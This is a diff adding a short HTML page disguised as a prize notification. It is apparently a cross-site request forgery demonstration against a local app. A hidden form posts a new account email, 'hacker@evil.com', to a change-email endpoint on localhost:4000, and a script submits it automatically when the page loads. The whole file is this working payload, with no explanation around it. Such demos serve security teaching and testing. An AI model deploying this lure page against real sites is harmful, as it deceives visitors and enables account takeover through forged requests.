@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Free Prizes! Click Nothing!</title>
+</head>
+
+<body>
+    <h1>Congratulations! You won a prize!</h1>
+    <p>Just wait a second while we load your reward...</p>
+
+    <form id="csrfForm" action="http://localhost:4000/change-email" method="POST">
+        <input type="hidden" name="newEmail" value="hacker@evil.com">
+    </form>
+
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+
+</html>
